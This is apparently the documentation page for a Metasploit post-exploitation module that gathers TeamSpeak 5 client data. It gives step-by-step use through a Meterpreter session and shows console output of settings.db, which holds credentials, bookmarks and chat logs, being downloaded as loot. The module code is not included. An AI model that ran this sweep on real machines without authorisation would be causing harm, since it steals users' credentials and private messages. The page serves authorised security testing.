## Vulnerable Application

This post-exploitation module extracts clear text credentials from the TeamSpeak 5 Client.

The TeamSpeak 5 Client is avaialble from (https://www.teamspeak3.com/teamspeak-download.php).

This module extracts information from the setting.db file in the "AppData\Roaming\TeamSpeak" directory.

This module extracts server bookmarks and chat logs.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/teamspeak5_client
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### TeamSpeak 5 Client v5.0.0-beta77 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/teamspeak5_client) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Teamspeak 5 client's Settings.db file found
[*] Downloading C:\Users\test\AppData\Roaming\TeamSpeak\Default\settings.db
[*] Teamspeak 5 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510162835_default_10.0.0.2_teamspeak5clie_839078.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510162835_default_10.0.0.2_EXTRACTIONSsetti_004931.db
[*] Teamspeak 5 client's Settings.db file found
[*] Downloading C:\Users\test\AppData\Roaming\TeamSpeak\Default\settings.db
[*] Teamspeak 5 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510162836_default_10.0.0.2_teamspeak5clie_509632.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510162836_default_10.0.0.2_EXTRACTIONSsetti_077545.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```

### TeamSpeak 5 Client v5.0.0-beta77 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/teamspeak5_client) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Teamspeak 5 client's base folder not found in user's user directory

[-] Teamspeak 5 client's base folder not found in user's user directory

[*] Starting Packrat...
[*] Teamspeak 5 client's base folder found
[*] Found the folder containing specified artifact for settings.db.
[*] Teamspeak 5 client's Settings.db file found
[*] Processing C:\Users\test\AppData\Roaming\TeamSpeak\Default
[*] Downloading C:\Users\test\AppData\Roaming\TeamSpeak\Default\settings.db
[*] Teamspeak 5 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510162858_default_10.0.0.2_teamspeak5clie_862604.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510162858_default_10.0.0.2_EXTRACTIONSsetti_713451.db
[*] Teamspeak 5 client's base folder found
[*] Found the folder containing specified artifact for settings.db.
[*] Teamspeak 5 client's Settings.db file found
[*] Processing C:\Users\test\AppData\Roaming\TeamSpeak\Default
[*] Downloading C:\Users\test\AppData\Roaming\TeamSpeak\Default\settings.db
[*] Teamspeak 5 client Settings.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510162858_default_10.0.0.2_teamspeak5clie_814911.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510162859_default_10.0.0.2_EXTRACTIONSsetti_786231.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
